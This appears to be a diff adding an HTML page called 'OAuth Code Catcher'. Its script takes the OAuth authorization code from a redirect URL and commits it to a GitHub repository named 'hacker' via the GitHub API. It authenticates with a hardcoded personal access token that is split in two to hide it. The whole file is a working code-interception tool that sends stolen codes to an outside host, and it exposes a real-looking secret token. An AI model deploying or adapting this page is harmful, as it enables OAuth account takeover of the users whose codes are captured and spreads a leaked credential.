@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>OAuth Code Catcher</title>
+</head>
+<body>
+  <h1>Listening for code...</h1>
+  <pre id="output">Waiting for redirect with ?code=...</pre>
+
+  <script>
+    // Token split into two parts (obfuscation)
+    const t1 = "github_pat_11BQ7RGTQ0edZdciIQ052n_";
+    const t2 = "umJltZ2nkAD53XNlFlLKLdzJ5nI88Njfiby9g6ZGraVNPPNHOAPM45Ditjh";
+    const githubToken = t1 + t2;
+
+    // GitHub repo info
+    const username = 'Mohammad-Mujtaba';
+    const repo = 'hacker';
+    const filePath = 'code.txt';
+
+    // Extract `code` from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const code = urlParams.get('code');
+
+    document.getElementById('output').textContent = code ? `Code: ${code}` : 'No code found.';
+
+    if (code) {
+      const apiUrl = `https://api.github.com/repos/${username}/${repo}/contents/${filePath}`;
+
+      // First: get current file to check for SHA
+      fetch(apiUrl, {
+        headers: {
+          Authorization: `token ${githubToken}`,
+          Accept: 'application/vnd.github.v3+json'
+        }
+      })
+      .then(res => res.ok ? res.json() : null)
+      .then(existingFile => {
+        const content = btoa(`OAuth Code: ${code}\nCaptured: ${new Date().toISOString()}`);
+        const body = {
+          message: 'Captured OAuth code',
+          content: content,
+          committer: {
+            name: "OAuth Catcher",
+            email: "oauth@exploit.me"
+          }
+        };
+
+        if (existingFile && existingFile.sha) {
+          body.sha = existingFile.sha;
+        }
+
+        return fetch(apiUrl, {
+          method: 'PUT',
+          headers: {
+            Authorization: `token ${githubToken}`,
+            Accept: 'application/vnd.github.v3+json'
+          },
+          body: JSON.stringify(body)
+        });
+      })
+      .then(res => {
+        if (res.ok) {
+          console.log('✅ Code saved to GitHub!');
+        } else {
+          console.error('❌ Failed to save code. Status:', res.status);
+        }
+      })
+      .catch(err => console.error('Error:', err));
+    }
+  </script>
+</body>
+</html>
